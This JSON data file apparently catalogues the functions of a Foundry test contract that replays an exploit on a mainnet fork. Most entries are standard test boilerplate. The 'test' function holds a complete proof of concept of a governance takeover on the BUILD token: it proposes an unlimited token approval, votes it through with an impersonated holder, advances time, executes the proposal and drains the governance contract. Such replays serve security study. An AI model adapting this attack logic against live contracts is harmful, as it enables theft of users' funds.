[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 14_235_712); // fork mainnet at block 14235712\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "test",
    "original_code": "    function test() public {\n        cheat.prank(0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1);\n        build.transfer(address(this), 101_529_401_443_281_484_977);\n        emit log_named_uint(\"Befre proposing, BUILD balance of attacker:\", build.balanceOf(address(this)));\n        build.approve(address(BuildGovernance), type(uint256).max);\n\n        BuildGovernance.propose(\n            0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,\n            0,\n            hex\"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"\n        );\n        emit log_named_uint(\"After proposing, BUILD balance of attacker:\", build.balanceOf(address(this)));\n        emit log_named_uint(\"BUILD balance of BuildGovernance contract:\", build.balanceOf(address(BuildGovernance)));\n        cheat.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);\n        build.approve(address(BuildGovernance), type(uint256).max);\n        cheat.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);\n        BuildGovernance.vote(8, true);\n        emit log_named_int(\"Proposal count:\", BuildGovernance.proposalCount());\n        emit log_named_uint(\"Proposal state:\", BuildGovernance.state(8));\n\n        cheat.warp(1_655_436_437);\n        emit log_named_uint(\"After 2 days, Proposal state:\", BuildGovernance.state(8));\n        BuildGovernance.execute(\n            8,\n            0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,\n            0,\n            hex\"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"\n        );\n        build.transferFrom(address(BuildGovernance), address(this), build.balanceOf(address(BuildGovernance)));\n        emit log_named_uint(\"After exploiting, BUILD balance of attacker:\", build.balanceOf(address(this)));\n    }\n",
    "description": ""
  }
]